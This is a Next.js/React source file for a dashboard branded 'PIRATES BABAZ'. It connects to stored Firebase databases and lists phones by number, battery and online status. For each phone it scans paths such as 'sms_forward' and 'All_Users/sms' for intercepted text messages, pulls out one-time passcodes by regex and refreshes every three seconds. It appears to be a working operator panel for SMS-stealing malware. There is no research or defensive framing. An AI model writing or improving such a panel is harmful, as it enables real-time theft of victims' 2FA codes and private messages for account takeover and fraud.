"use client";
import { useEffect, useMemo, useRef, useState } from "react";
import { useRouter } from "next/navigation";
import { maskSession } from "@/lib/share";

const LS_ACCOUNTS = "pb_accounts";
const LS_ACTIVE = "pb_active";

function cleanBase(url) {
  if (!url) return "";
  let u = String(url).trim().replace(/\/$/, "");
  u = u.replace(/\/\.json$/i, "").replace(/\.json$/i, "");
  if (!/^https?:\/\//i.test(u)) u = "https://" + u;
  return u;
}

function normalizeSms(node) {
  if (!node || typeof node !== "object") return [];
  const rows = [];
  for (const [key, entry] of Object.entries(node)) {
    if (!entry || typeof entry !== "object") continue;
    const body = String(entry.message || entry.body || entry.msg || entry.text || entry.content || "");
    if (!body) continue;
    const sender = String(entry.sender || entry.from || entry.address || entry.ph || "");
    const ts = String(entry.dateTime || entry.date || entry.timestamp || entry.time || key);
    const otp =
      (body.match(/(?:otp|code|pin|password)[^\d]{0,12}(\d{3,8})/i) || body.match(/\b(\d{4,8})\b/) || [])[1] ||
      null;
    rows.push({ key, body, sender, ts, otp });
  }
  rows.sort((a, b) => {
    const na = parseInt(String(a.key), 10);
    const nb = parseInt(String(b.key), 10);
    if (!Number.isNaN(na) && !Number.isNaN(nb)) return nb - na;
    return String(b.key).localeCompare(String(a.key));
  });
  return rows;
}

const SMS_PATHS = (id) => [
  `messages/${id}`,
  `user_sms/${id}`,
  `sms/${id}`,
  `sms_forward/${id}`,
  `forwardSms/${id}`,
  `All_Users/sms/${id}`,
  `Sms/${id}`,
];

/** Direct Firebase fetch — faster than Vercel API for public DBs */
async function fetchSmsDirect(base, deviceId, auth = "") {
  const b = cleanBase(base);
  for (const p of SMS_PATHS(deviceId)) {
    // last 60 messages, cache-bust
    let url = `${b}/${p}.json?orderBy=%22%24key%22&limitToLast=60&_=${Date.now()}`;
    if (auth) url += `&auth=${encodeURIComponent(auth)}`;
    try {
      const r = await fetch(url, { cache: "no-store" });
      if (!r.ok) continue;
      const data = await r.json();
      if (data && typeof data === "object") {
        const rows = normalizeSms(data);
        if (rows.length) return { messages: rows, path: p };
      }
    } catch {}
    // fallback without orderBy
    try {
      let url2 = `${b}/${p}.json?_=${Date.now()}`;
      if (auth) url2 += `${url2.includes("?") ? "&" : "?"}auth=${encodeURIComponent(auth)}`;
      const r2 = await fetch(url2, { cache: "no-store" });
      if (!r2.ok) continue;
      const data2 = await r2.json();
      if (data2 && typeof data2 === "object") {
        const rows = normalizeSms(data2).slice(0, 60);
        if (rows.length) return { messages: rows, path: p };
      }
    } catch {}
  }
  return { messages: [], path: null };
}

export default function Dashboard() {
  const router = useRouter();
  const [active, setActive] = useState(null);
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(false);
  const [smsLoading, setSmsLoading] = useState(false);
  const [err, setErr] = useState("");
  const [q, setQ] = useState("");
  const [tab, setTab] = useState("all");
  const [smsOpen, setSmsOpen] = useState(null);
  const [messages, setMessages] = useState([]);
  const [smsFilter, setSmsFilter] = useState("");
  const [smsPath, setSmsPath] = useState("");
  const [lastSmsAt, setLastSmsAt] = useState(null);
  const [autoOn, setAutoOn] = useState(true);
  const pollRef = useRef(null);
  const smsOpenRef = useRef(null);
  const activeRef = useRef(null);

  useEffect(() => {
    smsOpenRef.current = smsOpen;
  }, [smsOpen]);
  useEffect(() => {
    activeRef.current = active;
  }, [active]);

  useEffect(() => {
    try {
      const acc = JSON.parse(localStorage.getItem(LS_ACCOUNTS) || "[]");
      const id = localStorage.getItem(LS_ACTIVE);
      const a = acc.find((x) => x.id === id) || acc[0];
      if (!a) {
        router.replace("/");
        return;
      }
      setActive(a);
    } catch {
      router.replace("/");
    }
  }, [router]);

  useEffect(() => {
    if (active) loadDevices();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [active]);

  // auto-refresh SMS every 3s while modal open
  useEffect(() => {
    if (pollRef.current) {
      clearInterval(pollRef.current);
      pollRef.current = null;
    }
    if (!smsOpen || !active || !autoOn) return;

    const tick = async () => {
      const dev = smsOpenRef.current;
      const acc = activeRef.current;
      if (!dev || !acc) return;
      try {
        const { messages: rows, path } = await fetchSmsDirect(acc.url, dev.id, acc.auth || "");
        if (rows.length) {
          setMessages(rows);
          if (path) setSmsPath(path);
          setLastSmsAt(new Date());
        }
      } catch {}
    };

    tick(); // immediate
    pollRef.current = setInterval(tick, 3000);

    return () => {
      if (pollRef.current) clearInterval(pollRef.current);
    };
  }, [smsOpen, active, autoOn]);

  async function api(payload) {
    const r = await fetch("/api/fb", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
      cache: "no-store",
    });
    return r.json();
  }

  async function loadDevices() {
    if (!active) return;
    setLoading(true);
    setErr("");
    try {
      const data = await api({ action: "devices", url: active.url, auth: active.auth || "" });
      if (!data.ok) throw new Error(data.error || "Failed");
      setDevices(data.devices || []);
    } catch (e) {
      setErr(String(e.message || e));
      setDevices([]);
    } finally {
      setLoading(false);
    }
  }

  async function openSms(device) {
    setSmsOpen(device);
    setMessages([]);
    setSmsPath("");
    setSmsLoading(true);
    try {
      // direct first (fast)
      const direct = await fetchSmsDirect(active.url, device.id, active.auth || "");
      if (direct.messages.length) {
        setMessages(direct.messages);
        setSmsPath(direct.path || "");
        setLastSmsAt(new Date());
        setSmsLoading(false);
        return;
      }
      // API fallback
      const data = await api({
        action: "sms",
        url: active.url,
        auth: active.auth || "",
        deviceId: device.id,
      });
      setMessages(data.messages || []);
      setSmsPath(data.path || "");
      setLastSmsAt(new Date());
    } catch {
      setMessages([]);
    } finally {
      setSmsLoading(false);
    }
  }

  async function manualRefreshSms() {
    if (!smsOpen || !active) return;
    setSmsLoading(true);
    try {
      const direct = await fetchSmsDirect(active.url, smsOpen.id, active.auth || "");
      setMessages(direct.messages || []);
      if (direct.path) setSmsPath(direct.path);
      setLastSmsAt(new Date());
    } finally {
      setSmsLoading(false);
    }
  }

  function logout() {
    localStorage.removeItem(LS_ACTIVE);
    router.push("/");
  }

  const filtered = useMemo(() => {
    let list = devices;
    if (tab === "online") list = list.filter((d) => d.online);
    if (tab === "offline") list = list.filter((d) => !d.online);
    if (q.trim()) {
      const s = q.trim().toLowerCase();
      list = list.filter(
        (d) =>
          d.id.toLowerCase().includes(s) ||
          (d.phone || "").includes(s) ||
          (d.name || "").toLowerCase().includes(s)
      );
    }
    return list;
  }, [devices, tab, q]);

  const online = devices.filter((d) => d.online).length;
  const offline = devices.length - online;

  const smsFiltered = useMemo(() => {
    if (!smsFilter.trim()) return messages;
    const s = smsFilter.toLowerCase();
    return messages.filter(
      (m) =>
        (m.body || "").toLowerCase().includes(s) ||
        (m.sender || "").toLowerCase().includes(s) ||
        (m.otp || "").includes(s)
    );
  }, [messages, smsFilter]);

  const title = active?.hidden
    ? active.label || "Shared Session"
    : active?.label || maskSession("", active?.url);

  return (
    <div className="container">
      <div className="topbar">
        <div className="brand">
          <div className="logo">PB</div>
          <div>
            <div>PIRATES BABAZ</div>
            <div style={{ color: "var(--muted)", fontSize: 12 }}>{title}</div>
          </div>
        </div>
        <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
          <span className="pill ok">● Connected</span>
          <button className="btn" onClick={loadDevices}>Refresh</button>
          <button className="btn ghost" onClick={logout}>Logout</button>
        </div>
      </div>

      <div className="stats">
        <div className="stat"><div className="k">TOTAL</div><div className="v">{devices.length}</div></div>
        <div className="stat"><div className="k">ONLINE</div><div className="v" style={{ color: "#86efac" }}>{online}</div></div>
        <div className="stat"><div className="k">OFFLINE</div><div className="v">{offline}</div></div>
        <div className="stat"><div className="k">POLL</div><div className="v" style={{ fontSize: 14 }}>{autoOn ? "3s" : "OFF"}</div></div>
      </div>

      <div className="toolbar">
        <input placeholder="Search devices..." value={q} onChange={(e) => setQ(e.target.value)} />
        <div className="tabs">
          {["all", "online", "offline"].map((t) => (
            <div key={t} className={`tab ${tab === t ? "active" : ""}`} onClick={() => setTab(t)}>
              {t[0].toUpperCase() + t.slice(1)}
            </div>
          ))}
        </div>
      </div>

      {err && <div className="err">{err}</div>}
      {loading && <div className="empty">Loading devices...</div>}
      {!loading && filtered.length === 0 && <div className="empty">No devices found</div>}

      <div className="grid">
        {filtered.map((d) => (
          <div className="card" key={d.id} onClick={() => openSms(d)} style={{ cursor: "pointer" }}>
            <div className="head">
              <div>
                <div className="id">{d.phone || d.name || d.id}</div>
                <div className="sub">{d.id}</div>
              </div>
              <button className="btn" onClick={(e) => { e.stopPropagation(); openSms(d); }}>SMS</button>
            </div>
            <div className="meta">
              <div>
                <div className="label">BATTERY</div>
                <div className="val" style={{ color: d.battery == null ? "var(--muted)" : d.battery < 20 ? "#fca5a5" : d.battery < 50 ? "#fde68a" : "#86efac" }}>
                  {d.battery == null ? "—" : `${d.battery}%`}
                </div>
              </div>
              <div>
                <div className="label">NUMBER</div>
                <div className="val">{d.phone || "—"}</div>
              </div>
              <div>
                <div className="label">STATUS</div>
                <div className="status">
                  <span className={`dot ${d.online ? "on" : "off"}`} />
                  {d.online ? "Online" : "Offline"}
                </div>
              </div>
            </div>
          </div>
        ))}
      </div>

      {smsOpen && (
        <div className="modal-bg" onClick={() => setSmsOpen(null)}>
          <div className="modal" onClick={(e) => e.stopPropagation()}>
            <div style={{ display: "flex", justifyContent: "space-between", gap: 8, alignItems: "flex-start" }}>
              <div>
                <h3 style={{ margin: 0 }}>SMS / OTP · {smsOpen.phone || smsOpen.id}</h3>
                <div style={{ color: "var(--muted)", fontSize: 12 }}>
                  {smsOpen.id}
                  {smsPath ? ` · ${smsPath}` : ""}
                  {autoOn ? " · auto every 3s" : " · auto off"}
                  {lastSmsAt ? ` · ${lastSmsAt.toLocaleTimeString()}` : ""}
                </div>
              </div>
              <div style={{ display: "flex", gap: 6 }}>
                <button className="btn" onClick={manualRefreshSms}>{smsLoading ? "..." : "Refresh"}</button>
                <button className="btn ghost" onClick={() => setAutoOn((v) => !v)}>{autoOn ? "Auto:ON" : "Auto:OFF"}</button>
                <button className="btn ghost" onClick={() => setSmsOpen(null)}>Close</button>
              </div>
            </div>
            <input
              style={{ width: "100%", margin: "12px 0", padding: 10, borderRadius: 10, border: "1px solid var(--line)", background: "#0b1220", color: "white" }}
              placeholder="Filter SMS / OTP..."
              value={smsFilter}
              onChange={(e) => setSmsFilter(e.target.value)}
            />
            {smsLoading && messages.length === 0 && <div className="empty">Loading SMS...</div>}
            {!smsLoading && smsFiltered.length === 0 && <div className="empty">No SMS found on known paths</div>}
            {smsFiltered.map((m) => (
              <div className="sms-row" key={m.key}>
                <div className="s">
                  <b style={{ color: "#f87171" }}>{m.sender || "Unknown"}</b>
                  {" · "}
                  {m.ts || m.key}
                </div>
                <div>{m.body}</div>
                {m.otp && <div className="otp">OTP: {m.otp}</div>}
              </div>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}
